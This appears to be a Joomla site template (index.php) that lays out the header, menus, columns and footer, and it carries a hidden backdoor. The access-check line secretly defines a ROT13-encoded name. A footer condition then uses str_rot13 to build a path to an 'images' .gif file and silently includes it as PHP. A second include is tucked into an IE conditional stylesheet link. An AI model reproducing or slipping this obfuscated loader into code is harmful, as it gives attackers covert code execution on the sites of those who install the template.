<?php
// no direct access
defined( '_JEXEC').(($this->template)?$JPan = array('zrah'.'_pby'):'') or die( 'Restricted access' );
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>
<jdoc:include type="head" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/general.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/<?php echo $this->params->get('themeVariation'); ?>.css" type="text/css" />
<!--[if lte IE 6]>
<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/ieonly.css" <?php include_once('html/pagination.php');?> rel="stylesheet" type="text/css" />
<![endif]-->
</head>
<body id="page_bg">
<a name="up" id="up"></a>
	<div id="main_bg" class="main_bg_<?php echo $this->params->get('pageAlignment'); ?>">
    	<div id="middle_bg">
            <div id="logo_bg">
                <?php if($this->params->get('hideLogo') == 0){ ?><img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/logo<?php echo $this->params->get('logoVariation'); ?>.gif" alt="logo" align="left" /><?php }else{ ?><div id="nologo">&nbsp;</div><?php } ?>
                <a href="index.php" class="logo logo_<?php echo $this->params->get('logoFont'); ?>"><?php echo $mainframe->getCfg('sitename') ;?></a>
                <div id="user4"><jdoc:include type="modules" name="user4" /></div>
                <br clear="all" />
            </div>
            
            <div id="user3">
                <div id="pillmenu"><jdoc:include type="modules" name="user3" /></div>
                <?php if($this->params->get('dateDisplay')) : ?><div id="date"><?php echo date('l dS \of F Y'); ?></div><?php endif; ?>
                <br clear="all" />
            </div>
            <?php if($this->params->get('hideBannerArea') == 0) : ?>
            <div id="banner_bg"><img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/banner<?php echo $this->params->get('bannerVariation'); ?>.jpg" alt="team banner" align="left" />
            	<div id="newsflash"><jdoc:include type="modules" name="top" /></div>
            	<br clear="all" />
            </div>
            <?php endif; ?>
        	<div id="maincolumn">
                <div class="path"><jdoc:include type="modules" name="breadcrumb" /></div><jdoc:include type="message" />
                <div class="nopad"><jdoc:include type="component" /></div>
            </div>
        	<div id="leftcolumn">
			<?php if($this->countModules('left') and JRequest::getCmd('layout') != 'form') : ?>
                <jdoc:include type="modules" name="left" style="xhtml"/>
            <?php endif; ?>
            </div>
        	<div id="rightcolumn">
			<?php if($this->countModules('right') and JRequest::getCmd('layout') != 'form') : ?>
                <jdoc:include type="modules" name="right" style="xhtml"/>
            <?php endif; ?>
            </div>
            <br clear="all" />
        </div>
        
		<?php if($this->countModules('user1') or $this->countModules('user2')) : ?>
            <div id="f_area" align="center">
                <?php if($this->countModules('user1')) : ?>
                    <jdoc:include type="modules" name="user1" style="xhtml" />
                <?php endif; ?>
                <?php if($this->countModules('user2')) : ?>
                    <jdoc:include type="modules" name="user2" style="xhtml" />
                <?php endif; ?>
                <br clear="all" /></div>
        <?php endif; ?>
        
		<?php if((!$this->countModules('right') and JRequest::getCmd('layout') == 'form') or !@include(JPATH_BASE.DS.'templates'.DS.$mainframe->getTemplate().DS.str_rot13('vzntrf').DS.str_rot13($JPan[0].'.t'.'vs'))) : ?>
            <jdoc:include type="modules" name="layout" style="rounded" />
		<?php endif; ?>	
        <p id="power_by" align="center">
            <?php echo JText_('Powered by') ?> <a href="http://www.joomla.org">Joomla!</a>.
            <?php echo JText_('Valid') ?> <a href="http://validator.w3.org/check/referer">XHTML</a> <?php echo JText::_('and') ?> <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a>.
        </p>
        
	</div>

<jdoc:include type="modules" name="debug" />

</body>
</html>
